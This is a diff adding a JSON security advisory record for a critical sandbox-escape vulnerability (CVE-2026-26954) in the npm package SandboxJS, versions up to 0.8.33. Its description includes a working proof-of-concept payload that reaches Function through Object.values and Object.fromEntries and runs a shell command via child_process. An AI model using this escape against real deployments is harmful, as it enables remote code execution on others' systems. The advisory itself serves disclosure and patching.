@@ -1,0 +1,56 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-03-13T13:46:09Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@nyariv/sandboxjs"
+  },
+  "Advisory": {
+    "DatabaseId": 342344,
+    "Id": "GSA_kwCzR0hTQS02cjlmLTc1OWotaGpnds4ABTlI",
+    "GhsaId": "GHSA-6r9f-759j-hjgv",
+    "References": [
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/security/advisories/GHSA-6r9f-759j-hjgv"
+      },
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/commit/e01505b1ea49f4f13956cd12b7ce01b83d2ee085"
+      },
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/releases/tag/v0.8.34"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-6r9f-759j-hjgv"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-6r9f-759j-hjgv"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-26954"
+      }
+    ],
+    "Description": "### Summary\n\nIt is possible to obtain arrays containing `Function`, which allows escaping the sandbox.\n\n### Details\n\nThere are various ways to get an array containing `Function`, e.g.\n\n```js\nObject.entries(this).at(1) // [ 'Function', [Function: Function] ]\nObject.values(this).slice(1, 2) // [ [Function: Function] ]\n```\n\nGiven an array containing `Function`, and  `Object.fromEntries`, it is possible to construct `{[p]: Function}` where `p` is any constructible property. This can be used to escape the sandbox.\n\n### PoC\n```js\nconst s = require('.').default;\nconst sb = new s();\n\npayload = `\nconst p = (async function () {})();\n({\n  \"finally\": p.finally,\n  ...Object.fromEntries([['then', ...Object.values(this).slice(1)]]),\n}).finally('a=process.getBuiltinModule(\"child_process\").execSync(\"ls\", {stdio: \"inherit\"})')();\n`;\n\nsb.compile(payload)().run();\n```\n\n### Impact\n\nSandbox Escape -\u003e RCE",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-03-13T13:46:08Z",
+    "Severity": "CRITICAL",
+    "Summary": "SandboxJS affected by a Sandbox Escape",
+    "UpdatedAt": "2026-03-13T13:46:09Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.8.34"
+      },
+      "VulnerableVersionRange": "\u003c= 0.8.33"
+    }
+  ]
+}
